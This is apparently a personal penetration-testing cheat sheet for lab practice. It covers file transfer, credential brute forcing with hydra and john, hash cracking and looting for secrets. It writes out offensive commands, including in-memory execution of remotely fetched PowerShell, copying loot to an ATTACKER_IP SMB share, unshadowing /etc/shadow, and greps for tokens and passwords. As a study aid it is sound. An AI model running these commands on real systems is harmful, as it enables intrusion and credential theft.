# Fundamentals

## File Transfer

#### Python HTTP Server

`sudo python3 -m http.server 80`

#### Netcat&#x20;

```
nc -vlp [port] > file [receiver]
nc -N [receiver_IP] [receiver_port] < file [sender]
cat [file] | nc [receiver_IP] [receiver_port] - Alternative
```

#### SCP

`scp [-r] <local_path> $user@$ip:/<remote_path> [Upload local to remote]`

`scp [-r] $user@$ip:/<remote_path> <local_path> [Download remote to local]`&#x20;

#### Powershell

{% code fullWidth="false" %}
```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://IP/file', 'file')
Invoke-WebRequest http://10.10.106.147:1234/powercat.ps1 -OutFile script.ps1
iwr -uri $url -Outfile "full path"
wget http://10.10.106.147:1234/powercat.ps1 -outfile C:\Users\Public\powercat
curl

#Execute in Memory Directly
download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
```
{% endcode %}

#### Certutil

```
certutil -urlcache -f [path_to_file] [file_name]
```

#### SMB

```bash
#If target Windows machine explicitly asks for a secure server that requires a username password combo
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword

net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
net use \\ATTACKER_IP\share /del

#Else
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support 
#Target 
net use \\[ATTACKER_IP]\share

[CMD] copy [LOOT] "\\[ATTACKER_IP]\share" 
[PS] Copy-Item [LOOT] \\[ATTACKER_IP]\share\[LOOT]
```

## Brute Forcing Creds

Your wordlists HAVE to be on sight

Usually follow a username:username combo but it doesn't hurt to try another weak pass wordlist

```
Your manual enumeration from the site
/usr/share/seclists/Usernames/Names/names.txt
offsec, admin and root are also peak
Don't forget nagoya from PG lol
```

## Fixing Web Exploits

* Use a different exploit available
* Run the same exploit twice if it involves creating something and reading, may take time and might not have been there when attempted to be read
* If it involves sleeping/delay check if the command is actually executed or timeouts are an issue \[Pascha]
* Tweaking the payload if you're able to stand on business

{% embed url="https://docs.python.org/3.10/library/2to3.html" %}

#### Requests No Certificate

```
response  = requests.post(url, data=data, allow_redirects=False, verify=False)
The  "verify=False" ignores SSL certificate
```

#### Index Out of Range

For `IndexError: list index out of range`

Debug manually, add a print line to see what's going on

```
 print "[+] String that is being split: " + location
```

<div align="left"><figure><img src="../../.gitbook/assets/image.png" alt="" width="500"><figcaption></figcaption></figure></div>

## Password Cracking/Spraying

{% embed url="https://keydecryptor.com/" %}

{% embed url="https://github.com/openwall/john/blob/bleeding-jumbo/doc/DYNAMIC" %}
Crack salted passwords because hashcat just can't seem to get it
{% endembed %}

```
[file_ext]2john
john [--format=lm] --wordlist=/usr/share/wordlists/rockyou.txt [hash.txt]
unshadow /etc/passwd /etc/shadow > output [john this output normally]

hydra [-L [userlist.txt] -P [passwordlist.txt]]/[-C [combineduserpassfile]] [IP] http[s]-post-form "/[endpoint]:log=^USER^&pwd=^PASS^[rest of POST body if exist]:F=[error message]"
-C uses file in [user:pass] format and reduces the number of combinations and reduces bruteforce time, eg. retrieve username passwords from a db
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP:port> http-post-form "/backend/default/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

patato - brute force tool for various protocols incase hydra doesn't work out (legacy issues?)

.\hashcat64.exe -m [mode] hash.txt rockyou.txt -d 1
```

{% embed url="https://github.com/stealthsploit/OneRuleToRuleThemStill" %}

{% embed url="https://kevinovitz.github.io/TryHackMe_Writeups/passwordattacks/passwordattacks/#online-password-attacks" %}

## Looting

```
cat userlist.txt | tr ' ' '\n' | grep . [Replaces all whitespaces between values with newlines]
grep -r password . 2>/dev/null [searches for the value 'password' recursively across all files]
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'

cut -d "delimiter" -f (field number 1,2 etc.) file.txt
sed -i 's/[[:space:]]//g' your_file.txt [Remove all whitespaces]

Find directories having a particular name
find / -type d -name [directory] 2>/dev/null

Find directories writable by current user
find / -type d -maxdepth 5 -writable 2>/dev/null

Find passwords in files
grep -Ri 'password' [directory_to_search] 2>/dev/null
```

## Git

{% embed url="https://github.com/internetwache/GitTools" %}

{% embed url="https://github.com/arthaud/git-dumper" %}

```
python3 git_dumper.py http://192.168.220.144/.git/ website
#'website' at the end of the command is very imp the output will actlly be in cwd
[GO IN ORDER]
git status
git log
git diff --cached $file
git show <hash> [in logs]
git restore $file
git checkout $hash
```

The git repo we have looked recursively through every log for any creds to no avail, unfortunately we couldn't even identify if this repo was related to anything deployed here in any way

```
git log -S password
```
